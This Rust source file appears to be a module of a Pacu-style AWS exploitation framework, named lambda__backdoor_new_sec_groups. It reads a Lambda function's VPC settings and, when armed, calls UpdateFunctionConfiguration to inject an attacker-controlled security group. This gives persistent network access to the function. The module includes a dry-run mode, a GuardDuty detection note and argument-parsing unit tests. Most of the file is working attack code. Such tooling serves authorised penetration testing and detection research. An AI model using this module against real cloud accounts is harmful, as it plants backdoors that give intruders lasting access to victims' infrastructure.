//! lambda__backdoor_new_sec_groups — inject attacker-controlled security groups
//! into a Lambda function's VPC configuration.
//!
//! Category: PERSIST. Requires --armed for write operations.
//!
//! Concept: For Lambda functions configured with VPC, add an additional
//! security group that allows attacker-controlled ingress.
//!
//! Args:
//!   --function-name <name>        target Lambda function (required)
//!   --security-group-id <sg_id>   security group ID to inject (required)
//!   --exploit                     call UpdateFunctionConfiguration (requires --armed)
//!
//! Detection: lambda:UpdateFunctionConfiguration — GuardDuty Persistence:Lambda/FunctionUpdated

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let function_name: &str = {
        let pos = args.iter().position(|&a| a == "--function-name");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(n) => n,
            None => anyhow::bail!("--function-name <name> is required"),
        }
    };

    let security_group_id: &str = {
        let pos = args.iter().position(|&a| a == "--security-group-id");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(sg) => sg,
            None => anyhow::bail!("--security-group-id <sg_id> is required"),
        }
    };

    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    println!("{}", "lambda__backdoor_new_sec_groups".cyan().bold());
    println!(
        "  Detection: lambda:UpdateFunctionConfiguration — GuardDuty Persistence:Lambda/FunctionUpdated\n"
    );

    // ── Get current VPC configuration ─────────────────────────────────────
    let lambda = aws_sdk_lambda::Client::new(&ctx.sdk_config);

    let config = lambda
        .get_function_configuration()
        .function_name(function_name)
        .send()
        .await
        .context("lambda:GetFunctionConfiguration failed")?;

    let vpc_config = config.vpc_config();
    let current_sgs: Vec<String> = vpc_config
        .map(|v| {
            v.security_group_ids()
                .iter()
                .map(|s| s.to_owned())
                .collect()
        })
        .unwrap_or_default();

    let subnet_ids: Vec<String> = vpc_config
        .map(|v| {
            v.subnet_ids()
                .iter()
                .map(|s| s.to_owned())
                .collect()
        })
        .unwrap_or_default();

    if current_sgs.is_empty() && subnet_ids.is_empty() {
        println!(
            "{}",
            "Warning: Lambda function is not configured with a VPC. \
             UpdateFunctionConfiguration will add VPC config."
                .yellow()
        );
    } else {
        println!(
            "  Current security groups: {}",
            current_sgs.join(", ").cyan()
        );
        println!(
            "  Current subnets:         {}",
            subnet_ids.join(", ").cyan()
        );
    }

    // Check if the SG is already present
    if current_sgs.contains(&security_group_id.to_owned()) {
        println!(
            "\n  {} Security group {} is already attached to this function.",
            "[INFO]".green(),
            security_group_id.yellow()
        );
        return Ok(());
    }

    // Build the new SG list
    let mut new_sgs = current_sgs.clone();
    new_sgs.push(security_group_id.to_owned());

    println!(
        "\n  New security groups would be: {}",
        new_sgs.join(", ").yellow()
    );

    if !exploit {
        println!(
            "\n  {} Would call: lambda:UpdateFunctionConfiguration on '{}' to add sg '{}'",
            "[DRY-RUN]".cyan(),
            function_name,
            security_group_id
        );
        println!(
            "\n{}",
            "Run with --exploit --armed to perform the actual UpdateFunctionConfiguration call.".yellow()
        );
        return Ok(());
    }

    // ── Armed + exploit ───────────────────────────────────────────────────
    println!(
        "\n  {} Calling lambda:UpdateFunctionConfiguration on '{}'...",
        "[EXEC]".red().bold(),
        function_name
    );

    let mut req = lambda
        .update_function_configuration()
        .function_name(function_name);

    // Build VPC config with injected SG
    let mut vpc_builder = aws_sdk_lambda::types::VpcConfig::builder();
    for sg in &new_sgs {
        vpc_builder = vpc_builder.security_group_ids(sg);
    }
    for sn in &subnet_ids {
        vpc_builder = vpc_builder.subnet_ids(sn);
    }
    req = req.vpc_config(vpc_builder.build());

    req.send()
        .await
        .context("lambda:UpdateFunctionConfiguration failed")?;

    println!(
        "  {} Security group '{}' injected into function '{}'.",
        "[OK]".green().bold(),
        security_group_id.green(),
        function_name.green()
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "lambda__backdoor_new_sec_groups",
            author: "lancer-pacu",
            category: "PERSIST",
            one_liner: "Inject attacker-controlled security groups into a Lambda VPC config. Requires --armed + --exploit.",
            services: &["Lambda", "EC2"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "lambda__backdoor_new_sec_groups");
        assert!(found, "lambda__backdoor_new_sec_groups not found in inventory");
    }

    #[test]
    fn module_category_is_persist() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "lambda__backdoor_new_sec_groups")
            .expect("lambda__backdoor_new_sec_groups not found");
        assert_eq!(m.info.category, "PERSIST");
    }

    #[tokio::test]
    async fn missing_function_name_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--security-group-id", "sg-12345"]).await;
        assert!(result.is_err(), "expected error when --function-name is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--function-name"),
            "error should mention --function-name: {msg}"
        );
    }

    #[tokio::test]
    async fn missing_security_group_id_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--function-name", "my-function"]).await;
        assert!(result.is_err(), "expected error when --security-group-id is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--security-group-id"),
            "error should mention --security-group-id: {msg}"
        );
    }
}
